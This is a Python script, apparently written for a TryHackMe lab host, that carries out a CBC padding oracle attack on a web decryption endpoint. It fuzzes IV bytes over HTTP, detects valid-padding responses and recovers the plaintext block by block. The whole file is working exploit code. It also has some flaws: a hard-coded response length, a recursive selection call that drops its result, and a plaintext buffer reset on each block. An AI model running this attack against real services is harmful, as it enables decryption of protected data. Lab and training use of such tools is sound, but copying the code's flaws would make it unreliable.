from Crypto.Cipher import AES
import binascii
import requests
import hashlib
import sys
import base64

### Variables ###
url = "http://padding.thm:5002/decrypt?ciphertext="
block_size = 16
encrypted_bytes = "313233343536373839303132333435362cb8770371460c5a2dc6b6a7e65289b8"

### Oracle HTTP request handler  ###
def check_for_padding_error(full_encrypted_bytes):
    #r = requests.post(URL, data = {'ciphertext' : full_encrypted_bytes, 'key'    : key})
    r = requests.get(url + full_encrypted_bytes)
    if 'padding' in r.text.lower():
        padding_found = "Y"
    else:
        padding_found = "N"
    if 'error' in r.text.lower():
        error_found = "Y"
    else:
        error_found = "N"
    # BUG: slight response length varations resulted in the detection logic
    # not dectecting the one 'correct' response - as the length was out 
    # by one. as a result, ive set all the response lengths to 30.
    # return error_found, padding_found, r.status_code, len(r.content)
    return error_found, padding_found, r.status_code, 30
# Oracle Fuzzing #
results_list = []
def byte_fuzzer(block_length, ciphertext):
    counter = 0
    bytes_to_truncate = 2
    length_of_truncated_iv = block_length - bytes_to_truncate
    truncated_iv = "0" * length_of_truncated_iv   
    #print('[i] Fuzzing oracle endpoint. Please wait...')
    while counter < 256:
        hex_bytes = "{:02x}".format(counter)
        updated_iv = truncated_iv + hex_bytes
        full_encrypted_bytes = updated_iv + ciphertext
        results_list.append(hex_bytes +':'+ str(check_for_padding_error(full_encrypted_bytes)))
        counter += 1
    return results_list
# takes a list of results of the byte fuzz and adds a hash of the results to each item in the list
def analyse(results_list):
    analysis_list = []
    for item in results_list:
        byte_sent = item.split(':')[0]
        result = item.split(':')[1].split('(')[1].split(')')[0]
        #print("byte_sent" + byte_sent)
        #print("result" + result)
        hashed_result = hashlib.md5(result.encode())
        analysis_list.append(byte_sent + ':' + result + ':' + str(hashed_result.hexdigest()))
    return analysis_list
# takes the results of the byte fuzz with added hashes and returns a smaller list 
# where items are limited to those with unique hashes also counts the number of each unique hash 
def unique_table(analysis_list):
    list_of_all_hashes = []
    list_of_unique_hashes = []
    list_of_unique_hashes_with_count = []
    
    # create a list of unique hashes
    for item in analysis_list:
        result_hash = item.split(':')[2]
        list_of_unique_hashes.append(result_hash)
        
    # reduce the list of hashes to those that are unique    
    list_of_unique_hashes = list(dict.fromkeys(list_of_unique_hashes))
    
    # we add a 'column' (: seperator) which will store the frequency later on. 
    # for now, we add the 'column' and a value of zero
    for item in list_of_unique_hashes:
        list_of_unique_hashes_with_count.append(item + ':0')
    # we now create one final list of unique entries only, where we pull in all 
    # the data, and add a frequency (count) value for each unique entry
    for item in analysis_list:
        a = item.split(':')[0]
        b = item.split(':')[1]
        result_hash = item.split(':')[2]
        index = 0 # we need this to know which list entry to modify later
        for row in list_of_unique_hashes_with_count:
            hash_to_check = row.split(':')[0]
            hash_count = row.split(':')[1]
            if result_hash == hash_to_check:
                list_of_unique_hashes_with_count[index] = hash_to_check + ':' + str(int(hash_count)+1) + ':' + a + ':' + b
            index = index + 1
    return list_of_unique_hashes_with_count
# lets the user choose which critera match a valid decrypt event
def user_selection(unique_list):
    count = 1
    print('[i] Initial fuzz complete. ')
    print('[i] Please select an ID that matches a valid decrypt:\n')
    print('-------------------------------------------------')
    print(' ID Sent  Error  Padding  Status  Length  Count')
    print('-------------------------------------------------')
    for item in unique_list:
        line = item.split(':')
        chunk = line[3].split(',')
        error_found = chunk[0].strip("'")
        padding_found = chunk[1]
        status = chunk[2]
        length = chunk[3]
        print('[' + str(count) + ']' +' '+ line[2] + '    ' + error_found + '      ' + padding_found[2:].strip("'") + '       ' + status + '    ' + length + '      ' + line[1])
        count += 1
    print('-------------------------------------------------')        
    selection = input("\n Enter an ID: ")
    if int(selection) < (count + 1):
        if int(selection) > 0:
            print("[i] Continuing test with selection: " + selection)
            return unique_list[int(selection) - 1]
        else:
            user_selection(unique_list)
    else:
        user_selection(unique_list)
def full_byte_fuzzer(block_length, ciphertext, selection, position_to_fuzz, postfix_byte):
    bytes_to_truncate = (block_length - (position_to_fuzz * 2) + 2)
    length_of_truncated_iv = block_length - bytes_to_truncate
    truncated_iv = "0" * length_of_truncated_iv    
    #print("truncated_iv ", truncated_iv)
    #print("postfix_byte      ", postfix_byte)
    # this is the selection criteria from the user - e.g. 'Y', 'Y', 200, 4748
    target = '(' + selection.split(':')[3] + ')'
    
    counter = 0    
    while counter < 256:
        hex_bytes = "{:02x}".format(counter)
        updated_iv = truncated_iv + hex_bytes + postfix_byte
        #print("updated_iv  ", updated_iv)
        full_encrypted_bytes = updated_iv + ciphertext
        output = check_for_padding_error(full_encrypted_bytes)
        # if the response criteria match the criteria selected by the user, 
        # we found the one request that did not trigger a padding oracle error
        #print("output      ", str(output))
        if str(output) == target:
            #print("[i] Potential match found! Running secondary test.")
            
            # although a match has been found (say for 01 being the final 
            # byte of the plaintext block) there is a potential problem:
            # what if we instead matched on the last byte of 0202? or 030303? 
            # we can test for this by seeing if the previous byte matches this one
            # and if it does, we have found a match.
            # https://www.nccgroup.com/research/cryptopals-exploiting-cbc-padding-oracles/
            special_iv = truncated_iv[:-2] + "ff" + hex_bytes + postfix_byte
            #print("updated_iv  ", updated_iv)
            #print("special_iv  ", special_iv)
            new_encrypted_bytes = special_iv + ciphertext
            result = check_for_padding_error(new_encrypted_bytes)                        
            if str(result) != target:
                #print("[i] Passed secondary test! Match confirmed!")
                return hex_bytes
            else:
                None
                #print("[i] Failed secondary test. Resuming.")    
        counter += 1
    print("[!] Fatal error: No match was found.")
    sys.exit()
    
# receive two variables that are 'hex bytes as strings': e.g. 'f8' and '09'
# XOR them and return a 'hex bytes as string' such as 'd4'   
def change_to_be_hex(s):
    return int(s,base=16)
    
def xor_bytes(str1, str2):
    a = change_to_be_hex(str1)
    b = change_to_be_hex(str2)
    xored_bytes_as_hex = hex(a ^ b)
    xored_bytes_as_string = xored_bytes_as_hex[2:]
    return xored_bytes_as_string
# helper to chop the encrypted_bytes into a list of blocks based on the provided block_size    
def slice_up_encrypted_bytes(encrypted_bytes, block_size):
    # calculate the length in characters of a block 
    block_length = block_size * 2
    # ensure that encrypted bytes is a multiple of block size:
    if len(encrypted_bytes) % block_length != 0:    
        print("[!] Fatal error: Encrypted bytes must be a multiple of block size.")
        sys.exit()
    else:
        block_list = []
        i = 0
        no_blocks_in_encrypted_bytes = len(encrypted_bytes) / block_length
        print("[i] Block size:       " + str(block_size))
        print("[i] Number of blocks: " + str(int(no_blocks_in_encrypted_bytes)))
        while i < no_blocks_in_encrypted_bytes:
            block_list.append(encrypted_bytes[(i * block_length):(i * block_length) + block_length])
            i += 1            
        return(block_list, block_length)
if __name__ == '__main__':
    # chop the encrypted_bytes into blocks and put them in a list:
    block_list, block_length = slice_up_encrypted_bytes(encrypted_bytes, block_size)
   
    # STEP 1: perform an initial fuzz of the last byte of the last block
    # This step is just to gather the selection criteria of a non-padding error response 
    # Grab the final block for now - later we will need to loop down through the blocks: 
    ciphertext = block_list[-1]
    # fuzz the last byte of the IV and gather the details of the responses into results_list:
    results_list = byte_fuzzer(block_length, ciphertext)
    
    # analyze the results_list:
    analysis_list = analyse(results_list)
    
    # distil the analysis_list into unique results:
    unique_list = unique_table(analysis_list)
    # let the user select the signature of the non-padding error response from the unique results:
    selection = user_selection(unique_list)
    # STEP 2: Now that we have the selection criteria, we can start looping back from the final block to the first block
    block_count = 1
    while block_count < len(block_list):
        print("*** Starting Block " + str(block_count) + " of " + str(len(block_list)-1) + " ***")
        # obtain the current block from the ciphertext
        current_block = block_list[block_count]
        
        # initialise a negative counter at 1/2 of block_length
        # we will use this to work back from the last byte to 
        # the first of the block
        position_to_fuzz = block_size 
        # loop to fuzz each byte of a block:
        fuzz_loop_count = 1
        
        padding_array = ""
        postfix_byte_array = ""
        zeroing_iv_array = ""
        zeroing_iv_byte = ""
        postfix_byte = ""
        plaintext_buffer = ""
        
        while position_to_fuzz > 0:
            # get the matching byte:            
            byte_found = full_byte_fuzzer(block_length, current_block, selection, position_to_fuzz, postfix_byte)
            found_value = binascii.unhexlify(byte_found)
            print("[+] Success: (" + str(256 - (int.from_bytes(found_value, "little"))) + "/256) [Byte " + str(position_to_fuzz) + "]")            
           
            # get the current input value: 
            current_byte_input_value = f"{(fuzz_loop_count):02x}"  
           
            #print("byte_found:               ", byte_found)
            #print("current_byte_input_value: ", current_byte_input_value)          
            
            #print("XORing " + byte_found + " with " + current_byte_input_value + ":")
            zeroing_iv_byte = xor_bytes(byte_found, current_byte_input_value)
            #print("zeroing_iv_byte:          ", zeroing_iv_byte)           
            zeroing_iv_array = zeroing_iv_byte + zeroing_iv_array
            i = fuzz_loop_count
            v = f"{(i+1):02x}"
            padding_array = v * i              
            #print("zeroing_iv_array:         ", zeroing_iv_array)
            #print("padding_array:            ", padding_array)            
   
            #print("XORing " + padding_array + " with " + zeroing_iv_array + ":")
            postfix_byte = xor_bytes(padding_array, zeroing_iv_array)
            #print("postfix_byte:             ", postfix_byte)
            #print("first loop:  ")
            #print("second loop: 30")
            #print("third loop:  3231")
            fuzz_loop_count += 1
            position_to_fuzz -= 1
        print("\nBlock " + str(block_count) + " Results:")
        print("[+] Cipher Text (HEX): ", current_block)
        print("[+] Intermediate Bytes (HEX): ", zeroing_iv_array)
        plain_text = xor_bytes(block_list[block_count - 1], zeroing_iv_array)
        print("[+] Plain Text: " + binascii.unhexlify(plain_text).decode())
        block_count += 1
        plaintext_buffer = plaintext_buffer + plain_text
    print("-------------------------------------------------------")
    print("*** Finished ***")
    print("")
    print("[+] Decrypted value (ASCII): " + binascii.unhexlify(plaintext_buffer).decode())
    print("")
    print("[+] Decrypted value (HEX): " + plain_text)
    print("")
    #plaintext_buffer_bytes = plaintext_buffer.decode("ascii")
    base64_bytes = base64.b64encode(binascii.unhexlify(plaintext_buffer))
    base64_string = base64_bytes.decode("ascii")
    print("[+] Decrypted value (Base64): " + base64_string)
    print("")
    print("-------------------------------------------------------")